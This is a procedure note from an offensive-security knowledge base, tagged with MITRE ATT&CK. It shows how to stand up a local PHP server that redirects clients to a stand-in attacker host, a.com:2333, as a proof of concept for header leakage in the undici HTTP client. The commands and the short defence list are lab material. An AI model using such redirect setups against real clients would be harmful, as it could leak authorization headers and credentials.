---
id: proc-uuid-1
tags:
  - redirect-server
  - php
  - poc-setup
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:26.626Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Set-Up-Local-Redirect-Server-with-PHP

## Summary

This procedure sets up a simple PHP-based HTTP server on localhost that issues a redirect to a specified cross-origin URL, used in proof-of-concept demonstrations for redirect-based attacks like header leakage in HTTP clients.

## Description

In the context of exploiting client-side vulnerabilities such as undici's header handling flaw, this procedure creates a local server at http://127.0.0.1/ that responds with a 302 redirect to http://a.com:2333. This simulates an attacker's malicious website tricking a victim's client into following a redirect while preserving sensitive headers. Prerequisites include PHP installed on the system; the server runs on port 80 by default.

## Requirements

1. PHP 7+ installed
2. Localhost access without firewall blocks on port 80
3. Basic file system write permissions for script creation

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected HTTP redirects in client logs
- Use web application firewalls to block suspicious redirect patterns
- Enforce strict origin policies in HTTP clients

## Objectives

1. Establish a controlled redirect endpoint for testing
2. Verify redirect functionality before sending client requests
3. Simulate cross-origin scenarios without external dependencies

## Instructions

### Step 1: Create Redirect Script

**Context**: Write a minimal PHP script that sends a Location header for redirection.

**Command** (create file):
```bash
cat > redirect.php << EOF
<?php header('Location: http://a.com:2333'); ?>
EOF
```

> This creates redirect.php with the redirect header. Expected output: File created successfully.

### Step 2: Start PHP Server

**Context**: Launch the built-in PHP server to host the redirect script.

**Command** (start server):
```bash
php -S 127.0.0.1:80 redirect.php
```

> Starts server on port 80. Expected output: "PHP 8.x.x Development Server started at http://127.0.0.1:80".

### Step 3: Verify Redirect

**Context**: Test the redirect manually to ensure it works.

**Command** (test with curl):
```bash
curl -I http://127.0.0.1/
```

> Should return HTTP/1.1 302 Found with Location: http://a.com:2333.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]

## Tags

- redirect-server
- php
- poc-setup
